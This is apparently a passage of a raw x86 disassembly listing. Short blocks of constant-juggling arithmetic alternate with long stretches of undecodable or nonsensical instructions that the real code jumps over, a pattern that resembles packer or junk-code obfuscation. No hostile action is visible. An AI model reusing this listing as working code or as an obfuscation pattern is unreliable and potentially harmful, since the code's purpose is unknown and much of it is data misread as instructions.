  40cb19:	scas   eax,DWORD PTR es:[edi]
  40cb1a:	mov    dh,0x26
  40cb1c:	mov    ecx,0x128af404
  40cb21:	sub    eax,0x7e177b06
  40cb26:	icebp  
  40cb27:	sub    edi,esp
  40cb29:	stos   BYTE PTR es:[edi],al
  40cb2a:	pusha  
  40cb2b:	lahf   
  40cb2c:	inc    edi
  40cb2d:	pop    eax
  40cb2e:	and    al,0xd9
  40cb30:	push   edx
  40cb31:	push   edx
  40cb32:	inc    ecx
  40cb33:	xor    al,0xd2
  40cb35:	adc    al,0x9f
  40cb37:	gs pop esi
  40cb39:	and    DWORD PTR [edx+0x6d17f1f2],eax
  40cb3f:	loop   0x40cb94
  40cb41:	push   cs
  40cb42:	out    dx,eax
  40cb43:	jmp    0x40cb94
  40cb45:	xchg   edi,eax
  40cb46:	fcom   QWORD PTR [ebx-0x49ce4373]
  40cb4c:	(bad)  
  40cb4d:	jle    0x40cb1b
  40cb4f:	popf   
  40cb50:	xchg   esp,eax
  40cb51:	jg     0x40cbc7
  40cb53:	jo     0x40cb5f
  40cb55:	adc    edi,DWORD PTR [edi-0x26dcd3ad]
  40cb5b:	lea    edi,[edi-0x1a]
  40cb5e:	into   
  40cb5f:	xor    eax,0xa6aac13
  40cb64:	mov    edi,0x754a6e22
  40cb69:	(bad)  
  40cb6a:	xchg   ecx,eax
  40cb6b:	clc    
  40cb6c:	jne    0x40cbd2
  40cb6e:	sub    al,0xb4
  40cb70:	adc    eax,0xb5c93668
  40cb75:	cs cs add eax,0xb7014d00
  40cb7c:	test   al,0x52
  40cb7e:	shl    BYTE PTR [ebp-0x64],cl
  40cb81:	mov    ds:0xe0bdc850,al
  40cb86:	xor    BYTE PTR [edi],ch
  40cb88:	std    
  40cb89:	(bad)  
  40cb8a:	fiadd  DWORD PTR ds:0x3dab65ac
  40cb90:	es test al,0xd1
  40cb93:	dec    ebp
  40cb94:	jg     0x40cbdd
  40cb96:	fidivr WORD PTR [ecx-0x68]
  40cb99:	push   0xa6d97abc
  40cb9e:	popa   
  40cb9f:	leave  
  40cba0:	mov    es,WORD PTR [eax+0x31]
  40cba3:	loope  0x40cb79
  40cba5:	add    esp,DWORD PTR [eax+0xd910006]
  40cbab:	xchg   esi,eax
  40cbac:	imul   edi,DWORD PTR [esi-0x50b86c75],0x3a6a3e89
  40cbb6:	ja     0x40cbd7
  40cbb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb9:	jecxz  0x40cb5f
  40cbbb:	in     eax,0xaa
  40cbbd:	out    dx,eax
  40cbbe:	xchg   esi,eax
  40cbbf:	sbb    eax,0xb59c1dca
  40cbc4:	and    BYTE PTR [ecx-0x2d7a9f44],bh
  40cbca:	adc    al,ah
  40cbcc:	xor    BYTE PTR [edx],bh
  40cbce:	cmc    
  40cbcf:	jbe    0x40cb93
  40cbd1:	jle    0x40cb66
  40cbd3:	scas   al,BYTE PTR es:[edi]
  40cbd4:	bound  eax,QWORD PTR [ecx]
  40cbd6:	and    BYTE PTR [edx+ecx*4+0x3393883e],bh
  40cbdd:	out    0xeb,eax
  40cbdf:	jae    0x40cc06
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x422670,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax-0x55a68a22],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    BYTE PTR [eax+0x70],ch
  40cc79:	or     esp,DWORD PTR [edi]
  40cc7b:	mov    ds,esi
  40cc7d:	scas   al,BYTE PTR es:[edi]
  40cc7e:	sahf   
  40cc7f:	test   eax,0x3dbec4d5
  40cc84:	js     0x40ccb2
  40cc86:	xor    edi,ecx
  40cc88:	cmp    DWORD PTR [ecx+0x38ae41c0],edx
  40cc8e:	cmp    BYTE PTR [edi-0x251dd8ae],bh
  40cc94:	in     al,0xec
  40cc96:	retf   0x25ee
  40cc99:	xor    al,0xc6
  40cc9b:	add    eax,0x298d0094
  40cca0:	or     ch,BYTE PTR [ebp+0x41]
  40cca3:	mov    ds:0x2cd099dc,eax
  40cca8:	jne    0x40cc2d
  40ccaa:	icebp  
  40ccab:	inc    ecx
  40ccac:	repnz stc 
  40ccae:	icebp  
  40ccaf:	dec    DWORD PTR [eax-0x1e]
  40ccb2:	fldenv ds:0x271ba12a
  40ccb8:	jns    0x40cc46
  40ccba:	call   0x1ec2:0x7dfe98eb
  40ccc1:	xor    al,0x30
  40ccc3:	cdq    
  40ccc4:	imul   esp,DWORD PTR [esi],0x53
  40ccc7:	pop    ds
  40ccc8:	xchg   ebp,eax
  40ccc9:	push   edi
  40ccca:	adc    eax,0x23cbf906
  40cccf:	sahf   
  40ccd0:	aaa    
  40ccd1:	in     eax,dx
  40ccd2:	pop    ebx
  40ccd3:	adc    BYTE PTR [ebx],0xaf
  40ccd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccd7:	push   edx
  40ccd8:	shl    DWORD PTR [edi],0xb4
  40ccdb:	sbb    BYTE PTR [eax+eax*2-0x34],cl
  40ccdf:	mov    ecx,DWORD PTR [esi+0x52b086f4]
  40cce5:	cmp    DWORD PTR [eax-0x1003942],ecx
  40cceb:	stos   BYTE PTR es:[edi],al
  40ccec:	push   eax
  40cced:	repz mov ah,0x2d
  40ccf0:	jo     0x40cce2
  40ccf2:	dec    ebp
  40ccf3:	rol    DWORD PTR [ebx+0x66d4466d],1
  40ccf9:	das    
  40ccfa:	loop   0x40cc7c
  40ccfc:	retf   
  40ccfd:	stc    
  40ccfe:	je     0x40cd55
  40cd00:	in     eax,dx
  40cd01:	mov    al,ds:0xe3b3bdf2
  40cd06:	std    
  40cd07:	inc    ch
  40cd09:	shl    DWORD PTR [ebp+0x66],1
  40cd0c:	addr16 hlt 
  40cd0e:	xchg   edi,eax
  40cd0f:	dec    esi
  40cd10:	test   al,0xd1
  40cd12:	xor    edi,DWORD PTR [esp+eax*4-0x6d]
  40cd16:	(bad)  
  40cd17:	xchg   ecx,eax
  40cd18:	(bad)  
  40cd19:	sub    al,0xa8
  40cd1b:	aad    0xfb
  40cd1d:	fnstenv [esi]
  40cd1f:	jbe    0x40cd7a
  40cd21:	xor    eax,0x816fff1e
  40cd26:	sahf   
  40cd27:	cmp    eax,0x1234c305
  40cd2c:	fs mov dl,0x7a
  40cd2f:	pop    ecx
  40cd30:	xchg   edi,eax
  40cd31:	int    0x56
  40cd33:	mov    bl,0x23
  40cd35:	mov    dl,0x5c
  40cd37:	or     eax,DWORD PTR [ebx]
  40cd39:	std    
  40cd3a:	mov    edx,0xf9504cf1
  40cd3f:	mov    BYTE PTR [ebx+0x30612d7e],dl
  40cd45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd46:	(bad)  
  40cd47:	loop   0x40cda3
  40cd49:	mov    WORD PTR [eax-0x61],es
  40cd4c:	xchg   edx,eax
  40cd4d:	idiv   BYTE PTR [ebx+edx*1]
  40cd50:	mov    al,ds:0x5e83161f
  40cd55:	je     0x40cd8b
  40cd57:	mov    esi,0xd8a9bf1b
  40cd5c:	retf   
  40cd5d:	pop    es
  40cd5e:	jmp    0xfe4bb8a5
  40cd63:	ss loopne 0x40cd3b
  40cd66:	xor    BYTE PTR [ebx+0x6217ba14],cl
  40cd6c:	ret    0x6161
  40cd6f:	or     eax,0xa925dcb8
  40cd74:	jle    0x40cd3d
  40cd76:	idiv   esi
  40cd78:	pusha  
  40cd79:	dec    ecx
  40cd7a:	(bad)  
  40cd7b:	cmp    al,0x4d
  40cd7d:	into   
  40cd7e:	and    BYTE PTR [eax-0x3172706f],0xb2
  40cd85:	push   edi
  40cd86:	jae    0x40cd4d
  40cd88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd89:	out    dx,eax
  40cd8a:	and    edi,DWORD PTR [edi-0x378b6f3a]
  40cd90:	out    dx,eax
  40cd91:	(bad)  
  40cd92:	call   DWORD PTR [ecx]
  40cd94:	mov    bl,0x0
  40cd96:	sbb    al,0x83
  40cd98:	das    
  40cd99:	mov    al,0x54
  40cd9b:	push   ds
  40cd9c:	cdq    
  40cd9d:	and    al,0x43
  40cd9f:	mov    DWORD PTR [ebp-0x3bbae438],ebx
  40cda5:	shld   ebp,ebp,cl
  40cda8:	xchg   ebp,eax
  40cda9:	jae    0x40cda7
  40cdab:	push   cs
  40cdac:	dec    esi
  40cdad:	aaa    
  40cdae:	sub    eax,edx
  40cdb0:	jno    0x40cd93
  40cdb2:	jnp    0x40cd75
  40cdb4:	ss dec esi
  40cdb6:	lods   al,BYTE PTR ds:[esi]
  40cdb7:	cmp    BYTE PTR ds:0xe6ca4c06,ch
  40cdbd:	push   edx
  40cdbe:	in     eax,0x1b
  40cdc0:	fimul  DWORD PTR [esi]
  40cdc2:	in     al,0x26
  40cdc4:	test   ebx,ecx
  40cdc6:	cmp    edi,DWORD PTR [esi]
  40cdc8:	mov    BYTE PTR [edx],0xd6
  40cdcb:	push   es
  40cdcc:	lods   eax,DWORD PTR ds:[esi]
  40cdcd:	jmp    0xac5e03c2
  40cdd2:	loop   0x40cdc0
  40cdd4:	ret    0xbae6
  40cdd7:	mov    ch,0x31
  40cdd9:	stos   DWORD PTR es:[edi],eax
  40cdda:	jmp    0xccbd:0xdda9524d
  40cde1:	cmp    al,BYTE PTR [edi-0x1271bca2]
  40cde7:	retf   0x5227
  40cdea:	cmp    ch,bl
  40cdec:	es jnp 0x40cdb4
  40cdef:	fsubr  QWORD PTR [ebx+0x1c7794d7]
  40cdf5:	iret   
  40cdf6:	push   ebp
  40cdf7:	dec    ebx
  40cdf8:	in     al,dx
  40cdf9:	or     ah,al
  40cdfb:	push   ebx
  40cdfc:	sbb    ebx,DWORD PTR [eax]
  40cdfe:	ins    DWORD PTR es:[edi],dx
  40cdff:	in     al,dx
  40ce00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce01:	lea    ecx,[edi]
  40ce03:	jne    0x40cdfd
  40ce05:	sbb    edi,DWORD PTR ds:0xbd5b9861
  40ce0b:	aaa    
  40ce0c:	dec    edi
  40ce0d:	test   al,0x92
  40ce0f:	ins    BYTE PTR es:[edi],dx
  40ce10:	and    edi,esp
  40ce12:	pop    ds
  40ce13:	lods   al,BYTE PTR ds:[esi]
  40ce14:	mov    al,ds:0xbe280750
  40ce19:	sbb    ecx,0xffffffc2
  40ce1c:	sub    edx,DWORD PTR ds:0x4fc391a
  40ce22:	fnstcw WORD PTR fs:[eax-0x3420c07f]
  40ce29:	lea    ebx,[bx+di+0x32]
  40ce2d:	imul   ebx,DWORD PTR [ebx+0x39],0xffffff88
  40ce31:	and    ah,ch
  40ce33:	dec    eax
  40ce34:	jae    0x40ce70
  40ce36:	fcom   st(2)
  40ce38:	fwait
  40ce39:	add    ah,BYTE PTR [edx]
  40ce3b:	sahf   
  40ce3c:	sbb    al,0xd5
  40ce3e:	cmp    DWORD PTR [esi-0x61],ebx
  40ce41:	or     eax,0xbe357bea
  40ce46:	test   eax,0x6ac39c06
  40ce4b:	mov    eax,0xb4d11a4d
  40ce50:	push   ecx
  40ce51:	mov    ebx,0xbe318aae
  40ce56:	mov    eax,ds:0xbdbbad53
  40ce5b:	hlt    
  40ce5c:	js     0x40ce97
  40ce5e:	aad    0x42
  40ce60:	lock repz xor esi,DWORD PTR [edi+0x2a]
  40ce65:	push   ebx
  40ce66:	shl    BYTE PTR [ebp-0x1e],1
  40ce69:	test   DWORD PTR [ecx-0x36eedb37],esi
  40ce6f:	lds    ecx,FWORD PTR [edi]
  40ce71:	lock aaa 
  40ce73:	test   BYTE PTR [esi-0x7e],dh
  40ce76:	push   DWORD PTR [edi+eax*2+0x1c93de9]
  40ce7d:	mov    esp,0xe5f418c1
  40ce82:	push   edx
  40ce83:	int3   
  40ce84:	cmp    bl,bh
  40ce86:	not    esi
  40ce88:	rol    BYTE PTR [edx+0x3116ee12],cl
  40ce8e:	mov    edi,0x58e1ae17
  40ce93:	shr    DWORD PTR [esi+0x6f71f313],cl
  40ce99:	aam    0xf6
  40ce9b:	add    DWORD PTR [ecx+0x32ce6d9c],0x74767755
  40cea5:	(bad)  [ebx-0x5691b401]
  40ceab:	mov    ds:0xc81f39ab,al
  40ceb0:	xchg   ebp,eax
  40ceb1:	mov    esi,0xdebdb688
  40ceb6:	test   al,0x24
  40ceb8:	cmc    
  40ceb9:	dec    esp
  40ceba:	imul   esp,DWORD PTR [eax],0xffffffda
  40cebd:	pop    ebp
  40cebe:	fstp   DWORD PTR [ebx+ebp*4+0x4cc0d30a]
  40cec5:	jecxz  0x40cece
  40cec7:	int    0xa4
  40cec9:	sub    eax,ebp
  40cecb:	shr    BYTE PTR [eax-0x3d],cl
  40cece:	dec    edx
  40cecf:	mov    cl,0x6
  40ced1:	inc    esi
  40ced2:	enter  0x5077,0x53
  40ced6:	mov    al,0x6b
  40ced8:	sbb    al,0x6f
  40ceda:	stc    
  40cedb:	leave  
  40cedc:	sub    dl,BYTE PTR [ecx+ebp*8+0x2d335514]
  40cee3:	inc    edx
  40cee4:	sbb    DWORD PTR [edi-0x118243d0],esp
  40ceea:	outs   dx,DWORD PTR ds:[esi]
  40ceeb:	cdq    
  40ceec:	test   eax,0x3dec5a45
  40cef1:	xchg   ebx,eax
  40cef2:	xchg   edi,eax
  40cef3:	(bad)  
  40cef4:	(bad)  [ecx+0x482aa473]
  40cefa:	aas    
  40cefb:	aaa    
  40cefc:	ds dec esi
  40cefe:	ret    0xf0a8
  40cf01:	xchg   ebp,eax
  40cf02:	iret   
  40cf03:	sbb    dl,BYTE PTR [eax+0x25da251]
  40cf09:	and    DWORD PTR [esi+ebx*2],0xffffff8c
  40cf0d:	sar    edx,1
  40cf0f:	arpl   WORD PTR [edx-0x26],dx
  40cf12:	lea    eax,[ecx-0x75]
  40cf15:	push   edi
  40cf16:	outs   dx,BYTE PTR ds:[esi]
  40cf17:	cmc    
  40cf18:	pause  
  40cf1a:	popa   
  40cf1b:	push   edi
  40cf1c:	sysret 
  40cf1e:	mov    eax,DWORD PTR [ebp-0x4]
  40cf21:	sub    ecx,eax
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422568
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi-0x213e432d],esi
  40cfad:	push   ss
  40cfae:	stos   BYTE PTR es:[edi],al
  40cfaf:	jb     0x40cf99
  40cfb1:	sbb    BYTE PTR [eax],bl
  40cfb3:	rcl    BYTE PTR [eax+ebx*1],cl
  40cfb6:	sbb    cl,ah
  40cfb8:	inc    esp
  40cfb9:	sbb    BYTE PTR [ecx],ch
  40cfbb:	jns    0x40cf89
  40cfbd:	lea    esp,[ebx-0x4f]
  40cfc0:	and    esp,DWORD PTR [esi+0x34cc8ec0]
  40cfc6:	ja     0x40cfc0
  40cfc8:	dec    BYTE PTR [ecx+edi*8+0x34c37d73]
  40cfcf:	je     0x40cf55
  40cfd1:	sbb    esp,DWORD PTR [edi-0x53]
  40cfd4:	and    edx,DWORD PTR [edx+0x74f5b4d1]
  40cfda:	sbb    BYTE PTR [esi+0x4b83690a],dl
  40cfe0:	inc    ebp
  40cfe1:	sbb    DWORD PTR [esi-0x3333c036],edx
  40cfe7:	mov    ds:0xdb3e2159,al
  40cfec:	imul   DWORD PTR [edx]
  40cfee:	stc    
  40cfef:	adc    DWORD PTR [esi],ebx
  40cff1:	fsubr  QWORD PTR [ebx+0x5845afb4]
  40cff7:	(bad)  
  40cff8:	fcomp  QWORD PTR [ecx]
  40cffa:	lods   al,BYTE PTR ds:[esi]
  40cffb:	xor    cl,ch
  40cffd:	push   eax
  40cffe:	sahf   
  40cfff:	mov    BYTE PTR [esi-0x36],0x9b
  40d003:	sar    DWORD PTR [ecx-0x21],0xc2
  40d007:	dec    edx
  40d008:	ja     0x40cfb7
  40d00a:	push   ss
  40d00b:	sub    eax,0xcb1d4f21
  40d010:	dec    eax
  40d011:	ficomp WORD PTR [ebp-0x67]
  40d014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d015:	std    
  40d016:	dec    ebx
  40d017:	push   0xa201a16d
  40d01c:	jbe    0x40d049
  40d01e:	cmc    
  40d01f:	cld    
  40d020:	into   
  40d021:	imul   edi,DWORD PTR [ebx+edi*4-0x5e],0x32e67060
  40d029:	or     BYTE PTR [ecx+0x46],0x34
  40d02d:	sub    dl,dl
  40d02f:	push   edx
  40d030:	adc    eax,0xe89cc4c1
  40d035:	(bad)  
  40d036:	pop    edi
  40d037:	cdq    
  40d038:	pusha  
  40d039:	adc    BYTE PTR [edx+0x45],0x4
  40d03d:	jp     0x40d0af
  40d03f:	loopne 0x40d006
  40d041:	inc    ebp
  40d042:	aaa    
  40d043:	mov    ecx,ebp
  40d045:	test   al,0x9f
  40d047:	sub    edx,esp
  40d049:	aam    0xcc
  40d04b:	xchg   esi,eax
  40d04c:	xchg   esp,eax
  40d04d:	test   al,0x30
  40d04f:	das    
  40d050:	out    dx,al
  40d051:	jne    0x40d04a
  40d053:	cmp    ch,dl
  40d055:	jg     0x40d0cb
  40d057:	(bad)
  40d05b:	dec    esp
  40d05c:	mov    ebp,0x18ce9314
  40d061:	mov    esi,0x33cdd48
  40d066:	and    bh,BYTE PTR [esi]
  40d068:	int3   
  40d069:	or     BYTE PTR [edx-0x6c],0x8
  40d06d:	adc    ecx,esp
  40d06f:	int    0xc4
  40d071:	cmp    bh,BYTE PTR [edi-0x22]
  40d074:	loope  0x40d030
  40d076:	xor    ecx,DWORD PTR [ecx+edi*8-0x6af2d480]
  40d07d:	and    al,0xac
  40d07f:	or     esp,DWORD PTR [edi+0x5a]
  40d082:	or     eax,0xe59d370c
  40d087:	ins    BYTE PTR es:[edi],dx
  40d088:	xor    eax,DWORD PTR [esi]
  40d08a:	jmp    0x40d0dd
  40d08c:	adc    bh,bh
  40d08e:	call   0x5462:0x60867d9c
  40d095:	adc    edi,DWORD PTR [edi+0x64d03828]
  40d09b:	push   0x6e3f7d6e
  40d0a0:	aas    
  40d0a1:	cmp    BYTE PTR [eax],al
  40d0a3:	push   ecx
  40d0a4:	fild   DWORD PTR [eax]
  40d0a6:	test   DWORD PTR [ebx-0x49],eax
  40d0a9:	inc    eax
  40d0aa:	push   edx
  40d0ab:	push   ebx
  40d0ac:	adc    BYTE PTR [eax],ah
  40d0ae:	ror    DWORD PTR [edx-0x4e],1
  40d0b1:	ss dec eax
  40d0b3:	fidivr DWORD PTR [esi-0x7b]
  40d0b6:	lea    edx,[edx+0x74]
  40d0b9:	lods   al,BYTE PTR ds:[esi]
  40d0ba:	inc    ecx
  40d0bb:	aam    0xee
  40d0bd:	xor    al,0xb7
  40d0bf:	sub    BYTE PTR [esp+eax*4+0x27],dh
  40d0c3:	test   DWORD PTR [ebp+0x4608aae9],ebx
  40d0c9:	xchg   edi,eax
  40d0ca:	(bad)  
  40d0cb:	out    dx,eax
  40d0cc:	pop    ebp
  40d0cd:	jnp    0x40d137
  40d0cf:	out    dx,eax
  40d0d0:	push   ebx
  40d0d1:	or     al,0x88
  40d0d3:	sub    dl,dl
  40d0d5:	inc    ebx
  40d0d6:	add    eax,0x6469806e
  40d0db:	mov    ebx,0x28701730
  40d0e0:	punpcklwd mm0,DWORD PTR [edi+ebx*8]
  40d0e4:	cmc    
  40d0e5:	out    dx,al
  40d0e6:	pop    ebx
  40d0e7:	inc    esp
  40d0e8:	mov    esi,0x2cd04baf
  40d0ed:	jmp    FWORD PTR [esi-0x1c72f7e0]
  40d0f3:	popf   
  40d0f4:	jecxz  0x40d11c
  40d0f6:	jno    0x40d098
  40d0f8:	sbb    ebx,0xff4cb35
  40d0fe:	out    dx,eax
  40d0ff:	imul   edx,DWORD PTR [esi],0x6e
  40d102:	push   ebp
  40d103:	mov    eax,ds:0x8454bcce
  40d108:	xchg   edi,eax
  40d109:	pop    es
  40d10a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d10b:	retf   
  40d10c:	jecxz  0x40d12d
  40d10e:	outs   dx,BYTE PTR ds:[esi]
  40d10f:	cmp    ebx,DWORD PTR [edx]
  40d111:	(bad)  
  40d112:	fbstp  TBYTE PTR [ebp+0x553bba3f]
  40d118:	mov    WORD PTR [ebp-0x15],es
  40d11b:	test   al,0x4b
  40d11d:	push   ss
  40d11e:	outs   dx,DWORD PTR ds:[esi]
  40d11f:	mov    esp,DWORD PTR [ecx]
  40d121:	jge    0x40d198
  40d123:	or     DWORD PTR [ecx],esp
  40d125:	or     eax,0x57ec9e69
  40d12a:	xor    dl,dl
  40d12c:	sbb    cl,cl
  40d12e:	imul   ebp,DWORD PTR [edx+0x5a],0xd423c056
  40d135:	in     eax,0x47
  40d137:	pop    esi
  40d138:	shl    BYTE PTR [edx-0x2a],cl
  40d13b:	cmp    eax,0xbd1b1b6b
  40d140:	and    al,0x55
  40d142:	pop    esi
  40d143:	or     BYTE PTR [edi-0x5dec42ff],ch
  40d149:	and    DWORD PTR [eax-0x2ea6197a],eax
  40d14f:	cmp    bl,BYTE PTR [ebx-0x16]
  40d152:	shr    esp,1
  40d154:	adc    esp,DWORD PTR [edx]
  40d156:	pop    ebp
  40d157:	sub    al,ch
  40d159:	ret    0x7dbd
  40d15c:	nop
  40d15d:	jge    0x40d12e
  40d15f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d160:	push   ebx
  40d161:	bound  edx,QWORD PTR [ecx-0x34cb6123]
  40d167:	add    edx,DWORD PTR ds:0x15d0204b
  40d16d:	xchg   esi,eax
  40d16e:	bound  esp,QWORD PTR ds:0x24abacab
  40d174:	xor    ebp,DWORD PTR [ebx]
  40d176:	xor    BYTE PTR [ecx],dl
  40d178:	ds cmc 
  40d17a:	xchg   edx,edi
  40d17c:	arpl   WORD PTR [ecx-0x22207508],bp
  40d182:	mov    cl,0xee
  40d184:	rcr    ch,cl
  40d186:	jle    0x40d1bc
  40d188:	data16 adc al,0xdf
  40d18b:	ss stos DWORD PTR es:[edi],eax
  40d18d:	adc    ecx,ebx
  40d18f:	mov    edi,0xde8cab9
  40d194:	dec    eax
  40d195:	leave  
  40d196:	adc    cl,BYTE PTR [ebp-0x19]
  40d199:	fnstenv [ecx-0x7c57a324]
  40d19f:	jecxz  0x40d1b0
  40d1a1:	fstp   st(4)
  40d1a3:	pop    esi
  40d1a4:	rcr    ebp,0xed
  40d1a7:	add    BYTE PTR [eax-0x35],dh
  40d1aa:	pop    ebp
  40d1ab:	sub    edx,DWORD PTR [ebp+0x15]
  40d1ae:	rol    BYTE PTR [edi],cl
  40d1b0:	enter  0x1161,0x1c
  40d1b4:	retf   
  40d1b5:	pop    eax
  40d1b6:	dec    esp
  40d1b7:	cld    
  40d1b8:	sbb    dh,BYTE PTR [ecx]
  40d1ba:	rcr    ch,0xba
  40d1bd:	sbb    DWORD PTR [esp+ebp*1+0x7b],ebp
  40d1c1:	fcom   QWORD PTR [ebx]
  40d1c3:	dec    ecx
  40d1c4:	xor    eax,0x16a59e33
  40d1c9:	scas   eax,DWORD PTR es:[edi]
  40d1ca:	jge    0x40d199
  40d1cc:	push   ebx
  40d1cd:	mov    edx,DWORD PTR [ecx-0x5fe72501]
  40d1d3:	sub    BYTE PTR [esi],al
  40d1d5:	shr    ch,1
  40d1d7:	retf   0x9d15
  40d1da:	iret   
  40d1db:	pop    eax
  40d1dc:	mov    bl,0x69
  40d1de:	mov    edx,0x7a404c3d
  40d1e3:	xchg   edx,eax
  40d1e4:	fadd   st,st(2)
  40d1e6:	fst    QWORD PTR [ebp+edi*8-0x3997977c]
  40d1ed:	scas   al,BYTE PTR es:[edi]
  40d1ee:	adc    BYTE PTR [ebp-0x12],cl
  40d1f1:	das    
  40d1f2:	adc    ebx,ebx
  40d1f4:	mov    DWORD PTR [edx+0x0],edi
  40d1f7:	pop    edx
  40d1f8:	in     eax,0x5d
  40d1fa:	mov    dl,0x27
  40d1fc:	sub    eax,0xbbe1db91
  40d201:	leave  
  40d202:	lss    ebx,FWORD PTR [eax-0x2e]
  40d206:	shr    BYTE PTR [edx+0x16bdc0f8],cl
  40d20c:	sbb    dl,BYTE PTR cs:[ebp+0x42c918e7]
  40d213:	or     ebp,DWORD PTR cs:[edx-0x3f]
  40d217:	inc    DWORD PTR [esi+0x4e]
  40d21a:	pop    ebp
  40d21b:	add    eax,0xa0f88acc
  40d220:	cmp    bl,dl
  40d222:	sbb    esp,DWORD PTR [ebx-0x80]
  40d225:	inc    eax
  40d226:	rcr    BYTE PTR [ebx-0x66],cl
  40d229:	imul   DWORD PTR fs:[eax+0x42]
  40d22d:	hlt    
  40d22e:	lahf   
  40d22f:	ins    DWORD PTR es:[edi],dx
  40d230:	ins    DWORD PTR es:[edi],dx
  40d231:	mov    bh,0xc4
  40d233:	in     al,dx
  40d234:	les    ebp,FWORD PTR [edi]
  40d236:	(bad)  
  40d237:	pop    esp
  40d238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d239:	xchg   edx,eax
  40d23a:	mov    edx,0x45a954fb
  40d23f:	(bad)  
  40d240:	test   eax,ebx
  40d242:	sbb    dl,BYTE PTR [ecx+0x5d1f3aa9]
  40d248:	cld    
  40d249:	(bad)  
  40d24a:	mov    al,ds:0xf6bd2fd9
  40d24f:	int3   
  40d250:	mov    WORD PTR [ebx+0x34],?
  40d253:	les    eax,FWORD PTR [edx-0x3647abf]
  40d259:	sub    DWORD PTR [edx-0x7718b24e],ebx
  40d25f:	add    al,0xe
  40d261:	mov    eax,DWORD PTR [ebp-0x14]
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
